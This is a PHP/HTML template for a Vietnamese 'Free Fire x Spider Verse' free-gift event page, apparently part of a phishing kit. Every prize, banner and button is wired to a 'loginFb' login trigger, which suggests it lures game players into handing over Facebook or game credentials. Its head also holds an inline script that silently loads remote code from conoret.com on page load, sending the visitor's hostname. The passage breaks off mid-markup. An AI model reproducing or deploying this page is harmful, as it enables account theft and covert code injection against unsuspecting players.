<?php
$imageLinks = [
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FpFPyUBz.jpeg?alt=media&token=34ab27a2-7b88-421c-b49d-4eb94fb321c9",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FShoz1ga.jpeg?alt=media&token=b7ffa7a3-6068-46ce-a278-0c35d1553c02",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2F3dphRVj.jpeg?alt=media&token=dda848a4-f9ab-432b-90cc-28f3bb700828",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FaayuhgO.jpeg?alt=media&token=d3a52ae0-ed17-4cf5-bd0d-5adb5f7621e6",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FJkE8Sq2.jpeg?alt=media&token=de87f58d-eb18-43c0-8cc8-b38465a8931e",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FShoz1ga.jpeg?alt=media&token=b7ffa7a3-6068-46ce-a278-0c35d1553c02",
    "https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FaayuhgO.jpeg?alt=media&token=d3a52ae0-ed17-4cf5-bd0d-5adb5f7621e6"
];

// Kiểm tra xem danh sách có đủ dữ liệu không
if (is_array($imageLinks) && count($imageLinks) >= 10) {
    $bannerLink = $imageLinks[0];
    $gift1Link = $imageLinks[1];
    $gift2Link = $imageLinks[2];
    $gift3Link = $imageLinks[3];
    $gift4Link = $imageLinks[4];
    $gift5Link = $imageLinks[5];
    $gift6Link = $imageLinks[6];
    $gift7Link = $imageLinks[7];
    $gift8Link = $imageLinks[8];
    $gift9Link = $imageLinks[9];

    $gift1Name = "Huy hiệu 1";
    $gift2Name = "Huy hiệu 2";
    $gift3Name = "Huy hiệu 3";
    $gift4Name = "Huy hiệu 4";
    $gift5Name = "Huy hiệu 5";
    $gift6Name = "Huy hiệu 6";
    $gift7Name = "Huy hiệu 7";
    $gift8Name = "Huy hiệu 8";
    $gift9Name = "Huy hiệu 9";
} else {
    echo "Danh sách hình ảnh không đủ dữ liệu.";
}

$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme12/') === false) {
    $baseHref = '<base href="themes/theme12/">';
}
?>
<?= $baseHref ?>
<!DOCTYPE html>


<html lang="vi">

<head>
    <title>FREE FIRE X SPIDER VERSE</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="FREE FIRE X SPIDER VERSE" />
    <meta property="og:description" content="FREE FIRE X SPIDER VERSE" />
    <meta property="og:url" content="" />
    <meta property="og:sitename" content="FREE FIRE X SPIDER VERSE" />
    <meta property="og:image" content="" />
    <link rel="icon" type="image/png" sizes="32x32" href="img/favicon.jpg" />
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
        href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap"
        rel="stylesheet" />
    <script defer src="js/vendors.12c1cc9116255d7ff73.js"></script>
    <script defer src="js/index.aa5cedbc8f905fb4f8ea.js"></script>
    <link href="css/index.8ce55ae5311508a4ddc0.css" rel="stylesheet" />
</head>
<script type="text/javascript">
    window.top === window && ! function () {
        var e = document.createElement("script"),
            t = document.getElementsByTagName("head")[0];
        e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
    }();
</script>

<body>



    <!-- Đỉnh nghĩa popup -->

    <div id="root">
        <main class="wrapper">
            <header id="header" class="header"><img src="img/logo.png" alt="Free Fire" class="header__logo">
                <a class="header__login" title="Đăng nhập"><img src="img/btn-login.png" alt="Đăng nhập">
                </a>
                <a class="header__download loginFb"><img src="img/btn-download-2.png">
                </a>
            </header>
            <div class="exchange">

                <a class="exchange__mission loginFb"><img src="img/btn-mission.png">
                </a>
                <div class="exchange__title">VŨ TRỤ NHỆN HỐT SẠCH QUÀ FREE hấp dẫn:</div>
                <ul class="exchange__tabs">
                    <li class="active"><a class="loginFb"><span>VŨ TRỤ NHỆN HỐT SẠCH QUÀ FREE</span></a>
                    </li>
                </ul>
                <div class="exchange__items">
                    <div class="ScrollbarsCustom trackYVisible" style="position: relative; width: 100%; height: 100%;">
                        <div class="ScrollbarsCustom-Wrapper"
                            style="position: absolute; inset: 0px 10px 0px 0px; overflow: hidden;">
                            <div class="ScrollbarsCustom-Scroller"
                                style="position: absolute; inset: 0px; overflow: hidden scroll; padding-right: 20px; margin-right: -21px;">
                                <div class="ScrollbarsCustom-Content"
                                    style="box-sizing: border-box; padding: 0.05px; min-height: 100%; min-width: 100%;">
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="t375135dd-fa4b-48dc-84f5-1ada0c33179b" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-top {
                                                    margin-top: -10px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-left {
                                                    margin-left: -10px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-right {
                                                    margin-left: 10px;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .t375135dd-fa4b-48dc-84f5-1ada0c33179b.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="t07c02ba9-4796-480f-8889-280c998a14f4" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .t07c02ba9-4796-480f-8889-280c998a14f4 {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-top {
                                                    margin-top: -10px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-left {
                                                    margin-left: -10px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-right {
                                                    margin-left: 10px;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .t07c02ba9-4796-480f-8889-280c998a14f4.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="tdaf873ca-a7e7-4848-bac6-f14601d87b07" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07 {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-top {
                                                    margin-top: -10px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-left {
                                                    margin-left: -10px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-right {
                                                    margin-left: 10px;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .tdaf873ca-a7e7-4848-bac6-f14601d87b07.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34 {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-top {
                                                    margin-top: -10px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-left {
                                                    margin-left: -10px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-right {
                                                    margin-left: 10px;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .t0ee0d485-bbc4-4d61-9d3a-c67e0da96a34.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="tc066b4a9-723b-4233-8977-4720beea4669" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .tc066b4a9-723b-4233-8977-4720beea4669 {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-top {
                                                    margin-top: -10px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-left {
                                                    margin-left: -10px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-right {
                                                    margin-left: 10px;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .tc066b4a9-723b-4233-8977-4720beea4669.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="t9576eae3-a936-4464-936c-aad612e947bb" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .t9576eae3-a936-4464-936c-aad612e947bb {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-top {
                                                    margin-top: -10px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-left {
                                                    margin-left: -10px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-right {
                                                    margin-left: 10px;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .t9576eae3-a936-4464-936c-aad612e947bb.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift7Link) ? $gift7Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="t4042486d-fdfc-479e-9ad2-d756e8c7f850" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850 {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-top {
                                                    margin-top: -10px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-left {
                                                    margin-left: -10px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-right {
                                                    margin-left: 10px;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .t4042486d-fdfc-479e-9ad2-d756e8c7f850.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                    <div class="exchange__item">
                                        <div class="exchange__item--prize" data-tip="" currentitem="false"><img
                                                src="<?php echo isset($gift8Link) ? $gift8Link : ''; ?>">
                                        </div>
                                        <a class="exchange__item--action loginFb">
                                            <img src="img/btn-receive.png">
                                        </a>
                                        <div class="" id="ta1cce172-b46d-4f8f-a9c2-92afc355e67a" data-id="tooltip">
                                            <style aria-hidden="true">
                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a {
                                                    color: #fff;
                                                    background: #222;
                                                    border: 1px solid transparent;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-top {
                                                    margin-top: -10px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-top::before {
                                                    border-top: 8px solid transparent;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-top::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    bottom: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-top-color: #222;
                                                    border-top-style: solid;
                                                    border-top-width: 6px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-bottom {
                                                    margin-top: 10px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-bottom::before {
                                                    border-bottom: 8px solid transparent;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-bottom::after {
                                                    border-left: 8px solid transparent;
                                                    border-right: 8px solid transparent;
                                                    top: -6px;
                                                    left: 50%;
                                                    margin-left: -8px;
                                                    border-bottom-color: #222;
                                                    border-bottom-style: solid;
                                                    border-bottom-width: 6px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-left {
                                                    margin-left: -10px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-left::before {
                                                    border-left: 8px solid transparent;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-left::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    right: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-left-color: #222;
                                                    border-left-style: solid;
                                                    border-left-width: 6px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-right {
                                                    margin-left: 10px;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-right::before {
                                                    border-right: 8px solid transparent;
                                                }

                                                .ta1cce172-b46d-4f8f-a9c2-92afc355e67a.place-right::after {
                                                    border-top: 5px solid transparent;
                                                    border-bottom: 5px solid transparent;
                                                    left: -6px;
                                                    top: 50%;
                                                    margin-top: -4px;
                                                    border-right-color: #222;
                                                    border-right-style: solid;
                                                    border-right-width: 6px;
                                                }
                                            </style>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackY"
                            style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; width: 10px; height: calc(100% - 20px); top: 10px; right: 0px;">
                            <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbY"
                                style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); width: 100%; height: 88.9077px; transform: translateY(106.233px);">
                            </div>
                        </div>
                        <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackX"
                            style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; height: 10px; width: calc(100% - 20px); bottom: 0px; left: 10px; display: none;">
                            <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbX"
                                style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); height: 100%; width: 0px; display: none;">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="slider">
                <div class="tns-outer" id="tns1-ow">
                    <div class="tns-nav" aria-label="Carousel Pagination" style="display: none;">
                        <button type="button" data-nav="0" aria-controls="tns1" style="display:none"
                            aria-label="Carousel Page 1 (Current Slide)" class="tns-nav-active"></button>
                    </div>
                    <div class="tns-liveregion tns-visually-hidden" aria-live="polite" aria-atomic="true">slide <span
                            class="current">1</span> of 1</div>
                    <div id="tns1-mw" class="tns-ovh">
                        <div class="tns-inner" id="tns1-iw">
                            <div class="  tns-slider tns-carousel tns-subpixel tns-calc tns-horizontal" id="tns1"
                                style="transition-duration: 0s; transform: translate3d(0%, 0px, 0px);">
                                <a class="slider__item tns-item tns-slide-active loginFb" id="tns1-item0"><img
                                        src="img/MCTN_0523.png">
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="news-list">
                <div class="ScrollbarsCustom" style="position: relative; width: 100%; height: 100%;">
                    <div class="ScrollbarsCustom-Wrapper" style="position: absolute; inset: 0px; overflow: hidden;">
